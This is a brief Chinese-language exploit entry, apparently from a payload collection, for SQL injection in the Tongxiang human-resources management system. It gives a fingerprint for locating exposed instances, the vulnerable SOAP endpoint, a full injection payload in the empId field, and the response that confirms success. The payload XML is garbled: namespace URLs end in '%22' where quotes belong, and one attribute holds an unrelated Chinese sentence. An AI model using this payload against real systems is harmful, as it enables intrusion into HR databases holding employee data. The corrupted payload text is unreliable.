# 同享人力资源管理系统administration存在sql注入漏洞

同享人力资源管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/images/tongxehr.ico"`
- **请求**：`POST /MobileService/Administration.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance%22 xmlns:xsd="http://www.w3.org/2001/XMLSchema%22 xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/%22>
<soap:Body>
<GetBed xmlns="山峰从云层中探出头来>
<company>-1</company>
<empId>-2 and 1=@@version</empId>
</GetBed>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200 nvarchar